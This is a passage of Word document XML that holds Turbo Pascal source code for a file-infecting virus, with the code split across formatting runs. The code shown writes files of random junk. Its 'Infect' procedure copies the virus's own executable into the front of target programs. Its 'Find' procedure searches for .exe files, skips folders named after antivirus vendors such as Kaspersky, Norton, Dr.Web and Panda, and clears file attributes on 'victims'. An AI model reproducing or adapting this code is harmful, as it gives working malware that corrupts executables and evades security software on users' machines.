      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(random(26)+65));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="757289C3" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>st</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>:=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>st+rch</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>BeginEnd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">(-1032); </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="461C0516" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">      </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>end;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="3BFBF196" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">    Assign(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>fch,st</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>+'.'+chr(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>ord</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(random(26)+65))+</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B6FE41A" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">    +chr(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>ord</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(random(</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>26)+</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>65))+chr(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>ord</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(random(26)+65)));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E8EA6C5" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">    Rewrite(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>fch</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>);</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="61A08791" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">    for </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>iii:=</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>1 to random(1000) do</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="667DA1C3" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">    begin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CB398BE" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">      </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>ch</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>:=</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>chr(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>ord</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(random(256)));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10F7A83D" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">      write(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>fch,ch</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07FDDF57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gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>end;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="316DC268" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">    close(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>fch</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>);</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="5AC7D34A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end;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="3F01B0F9" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>end;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="3EEF1A4C" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:lastRenderedPageBreak/>
        <w:t>procedure Infect(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>path,name</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>:string</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75D0A747" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t>var</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60AE4E8B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spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>FromF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> file;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A081F29" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">      </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>ToF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> file;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44A03A9E" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>BufVir</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>Bufer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51F58741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NumRead</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> Word;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5352A9DF" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t>begin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="254BA103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Assign(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>ToF,path+name</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="616CB120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reset(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>ToF,1);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21D40BF1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BlockRead</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>ToF,BufVir,SizeOf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>BufVir</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">), </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>NumRead</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EDAE4EE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seek(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>ToF,filesize</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>ToF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E8D6A23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BlockWrite</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>ToF,BufVir,NumRead</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">); </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>BeginEnd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">(-1715); </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="622D74DD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Assign(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>FromF,paramstr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(0));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04E92C50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reset(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>FromF,1);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0055AD5E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BlockRead</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>FromF,BufVir,SizeOf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>BufVir</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">), </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>NumRead</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71E89A61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seek(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>ToF,0);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03777407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BlockWrite</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>ToF,BufVir,NumRead</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18AAEAEA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Close(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>ToF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7002D996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Close(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>FromF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="386253BE" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>end;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="2F336A6E" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t>procedure Find(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>dir:pathstr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6286BF99" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t>var</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66712EEA" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>sr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>searchrec</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F21BB26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gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>f :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> file;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C15691C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Buf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> array[1..4] of Char;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C6E3BE1" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t>begin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BFBDF02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r w:rsidRPr="008231FF">
        <w:t>findfirst</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>dir</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>+'*.exe',</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>39,sr</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08A73961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if  (</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>pos('SYSTEM',</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>dir</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">)=0) and (pos('DRWEB', </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>dir</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>)=0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1250F636" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">  and (pos('KASPER</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>',</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>dir</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">)=0) and (pos('PANDA', </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>dir</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>)=0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47024365" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">  and (pos('NORTON</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>',</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>dir</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>)=0) and (pos('COMMON',</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>dir</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>)=0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CE041FF" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">  and (</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>pos(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">'DOCUM', </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>dir</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">)=0) and (pos('GVDG',  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>dir</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>)=0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0250B858" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">  then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DBCC03D" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">  while </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>doserror</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>=0 do</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D27CDCF" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">  if Victim&lt;13 then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B0F7375" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">  begin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ACD5A0D" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">  Assign(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>f,dir+sr.name</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="530452A7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r w:rsidRPr="008231FF">
        <w:t>setfattr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(f,0</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>);</w:t>
      </w:r>
